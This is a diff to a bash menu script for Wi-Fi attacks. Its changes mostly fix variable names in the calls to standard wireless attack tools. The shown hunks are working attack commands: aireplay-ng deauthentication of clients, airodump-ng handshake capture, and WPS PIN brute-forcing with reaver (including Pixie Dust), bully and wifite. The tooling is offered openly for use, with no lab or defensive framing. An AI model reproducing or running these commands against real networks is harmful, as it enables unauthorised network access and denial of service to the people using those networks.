@@ -174,7 +174,7 @@ case $option in
 					iwlist $interFace channel | grep Current
 					read -p "Enter channel of bssid: " channel
 					sudo iwconfig $interFace channel $channel
-					xterm -hold -e sudo aireplay-ng -0 $times -a $bssid $interFace
+					xterm -hold -e sudo aireplay-ng -0 $times -a $bssid $interface
 					;;
 
 					WifiPasswordBruteforce)
@@ -193,7 +193,7 @@ case $option in
 						read -p "Time to scan in secs: " time
 						echo "scaning..."			
 						nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
-						timeout $time xterm -hold -e sudo airodump-ng $option
+						timeout $time xterm -hold -e sudo airodump-ng $interface
 						;;
 
 						Regex_Capture)
@@ -206,8 +206,8 @@ case $option in
 						read -p "Channel: " CHANNEL
 						read -p "Station to deauth: " STATION
 						read -p "Name for capture file: " FILE
-						nohup xterm -hold -e sudo airodump-ng -c$CHANNEL -w $FILE -d $BSSID $option > /dev/null 2>&1 &
-						xterm -hold -e sudo aireplay-ng --deauth 0 -a $BSSID -c $STATION $option 
+						nohup xterm -hold -e sudo airodump-ng -c$CHANNEL -w $FILE -d $BSSID $interface > /dev/null 2>&1 &
+						xterm -hold -e sudo aireplay-ng --deauth 0 -a $BSSID -c $STATION $interface
 						;;
 
 						Cap_BruteForce)
@@ -288,7 +288,7 @@ case $option in
 					echo "scanning..."
 					sleep 1
 					nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
-					timeout $time xterm -hold -e sudo wash -i $option > /dev/null 2>&1 &
+					timeout $time xterm -hold -e sudo wash -i $interface > /dev/null 2>&1 &
 					;;
 					
 					Pixie_Dust)
@@ -296,7 +296,7 @@ case $option in
 					echo "For bruteforcing to stay stable, it recommended to associate with the target network"
 					read -p "Amount of time to scan for in secs: " time
 					nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
-					timeout $time nohup xterm -hold -e sudo wash -i $option > /dev/null 2>&1 &
+					timeout $time nohup xterm -hold -e sudo wash -i $interface > /dev/null 2>&1 &
 					echo "close xterm before entering essid"
 					read -p "enter bssid: " bssid
 					read -p "enter essid: " essid
@@ -322,42 +322,42 @@ case $option in
 					echo "scanning..."
 					sleep 1
 					nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
-					timeout $time xterm -hold -e sudo wash -i $option > /dev/null 2>&1 &
+					timeout $time xterm -hold -e sudo wash -i $interface > /dev/null 2>&1 &
 					iwlist $option channel | grep Current
 					echo "close xterm before entering bssid"
 					read -p "enter channel: " channel
 					read -p "enter bssid:" bssid 
 					
-					xterm -hold -e sudo reaver -c $channel -i $option -b $bssid -p "" -N
+					xterm -hold -e sudo reaver -c $channel -i $interface -b $bssid -p "" -N
 					;;
 
 					Wifite_Brute)
 					clear
-					xterm -hold -e sudo wifite -i $option -mac --wps
+					xterm -hold -e sudo wifite -i $interface -mac --wps
 					;;
 
 					Bully_Brute)		   
 					clear
 					read -p "Amount of time to scan for in secs: " time
 					nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
-					timeout $time nohup xterm -hold -e sudo wash -i $option > /dev/null 2>&1 &
+					timeout $time nohup xterm -hold -e sudo wash -i $interface > /dev/null 2>&1 &
 					echo "close xterm before entering essid"
 					read -p "enter bssid: " bssid
 					read -p "enter essid: " essid
 
-					xterm -hold -e sudo bully $option -b $bssid -e $essid
+					xterm -hold -e sudo bully $interface -b $bssid -e $essid
 					;;
 
 					Reaver_Brute_without_pixie)
 					clear
 					read -p "Amount of time to scan for in secs: " time
 					nohup timeout $time xterm -hold -e termdown $time > /dev/null 2>&1 &
-					timeout $time nohup xterm -hold -e sudo wash -i $option > /dev/null 2>&1 &
+					timeout $time nohup xterm -hold -e sudo wash -i $interface > /dev/null 2>&1 &
 					read -p "enter bssid: " bssid
 					read -p "enter essid: " essid
 					read -p "enter delay in secs: " delay
 
-					xterm -hold -e sudo reaver -i $option -b $bssid -e $essid -d$delay 
+					xterm -hold -e sudo reaver -i $interface -b $bssid -e $essid -d$delay 
 					;;
 					
 					AttacksMenu)
